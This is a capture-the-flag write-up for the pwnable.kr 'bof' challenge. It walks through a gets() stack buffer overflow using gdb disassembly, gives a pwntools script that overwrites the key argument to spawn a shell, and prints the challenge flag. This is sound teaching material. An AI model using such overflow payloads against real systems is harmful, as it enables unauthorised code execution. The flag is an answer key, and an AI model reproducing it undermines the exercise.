# bof

First, I used `file` command to check whether the binary file is using 32bit or 64bit.
```
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```
So, this is 32-bit ELF binary.

```c
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
```

The goal is overwriting the input variable `key` to `0xcafebabe`. The buffer `overflowme` has length at most 32, however it uses `gets` to update the data. This is typical buffer overflow vulnerability.
```
+----------------+
| argument1: key |
+----------------+
| return address |
+----------------+
|     old ebp    |
+----------------+
| overflowme[32] |
+----------------+
```
Above figure is predicted stack structure. However, it can be different due to compiler optimization, so we need to look the assembly code. I used gdb to do it. Make breakpoint on main, and run it. Disassembly result was:

```
(gdb) disass main
Dump of assembler code for function main:        
   0x5655568a <+0>:     push   %ebp
   0x5655568b <+1>:     mov    %esp,%ebp
=> 0x5655568d <+3>:     and    $0xfffffff0,%esp  
   0x56555690 <+6>:     sub    $0x10,%esp        
   0x56555693 <+9>:     movl   $0xdeadbeef,(%esp)
   0x5655569a <+16>:    call   0x5655562c <func> 
   0x5655569f <+21>:    mov    $0x0,%eax
   0x565556a4 <+26>:    leave  
   0x565556a5 <+27>:    ret    
End of assembler dump.
(gdb) disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   %ebp
   0x5655562d <+1>:     mov    %esp,%ebp
   0x5655562f <+3>:     sub    $0x48,%esp
   0x56555632 <+6>:     mov    %gs:0x14,%eax
   0x56555638 <+12>:    mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:    xor    %eax,%eax
   0x5655563d <+17>:    movl   $0x5655578c,(%esp)
   0x56555644 <+24>:    call   0xf7e3ecd0 <puts>
   0x56555649 <+29>:    lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:    mov    %eax,(%esp)
   0x5655564f <+35>:    call   0xf7e3e1b0 <gets>
   0x56555654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)        
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    movl   $0x5655579b,(%esp)
   0x56555664 <+56>:    call   0xf7e12830 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    movl   $0x565557a3,(%esp)
   0x56555672 <+70>:    call   0xf7e3ecd0 <puts>
   0x56555677 <+75>:    mov    -0xc(%ebp),%eax
   0x5655567a <+78>:    xor    %gs:0x14,%eax
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7ee54e0 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
```

We can observe that the argument of gets is in `-0x2c(%ebp)`. Also, the argument of `func` is located in `0x8(%ebp). The difference of them is 0x34, so the solver is:
```python
from pwn import *

p = remote('pwnable.kr', 9000)
payload = b'A'*0x34 + p32(0xcafebabe)
p.sendline(payload)
p.interactive()
```

Then we accessed shell. `cat flag` returns `daddy, I just pwned a buFFer :)`.